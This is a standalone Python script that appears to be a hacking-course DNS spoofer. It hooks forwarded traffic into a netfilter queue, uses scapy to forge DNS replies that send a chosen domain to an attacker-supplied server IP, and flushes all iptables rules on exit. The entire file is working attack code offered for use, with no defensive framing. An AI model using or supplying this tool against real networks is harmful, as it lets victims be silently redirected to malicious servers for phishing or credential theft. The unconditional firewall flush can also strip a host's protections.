#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import subprocess
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="URL to Spoof")
    parser.add_argument("-w", "--webserver", dest="webserver", help="New webserver ip")
    parser.add_argument("-d", "--debug", dest="debug", action="store_true", help=argparse.SUPPRESS)
    options = parser.parse_args()
    if not options.url:
        # handle error
        parser.error("[-] Please specify a url to spoof, use --help for more info")
    if not options.webserver:
        # handle error
        parser.error("[-] Please specify a new webserver [X.X.X.X] , use --help for more info")
    return options

def process_packet(packet):
    options = get_arguments()
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if options.url in qname:
            print("[+] Spoofing target traffic to " + options.url + " to " + options.webserver)
            answer = scapy.DNSRR(rrname=qname, rdata=options.webserver)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))
            
    packet.accept()

def set_iptables(debug):
    if debug:
        subprocess.call(["iptables","-I","OUTPUT","-j","NFQUEUE","--queue-num","0"])
        subprocess.call(["iptables","-I","INPUT","-j","NFQUEUE","--queue-num","0"])
    else:
        subprocess.call(["iptables","-I","FORWARD","-j","NFQUEUE","--queue-num","0"])

options = get_arguments()
set_iptables(options.debug)
print("[+] Setting up iptables...")
print("[+] Done.")
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    # clear queue
    print("[+] Flushing iptables")
    subprocess.call(["iptables","--flush"])
    print("[+] Done.")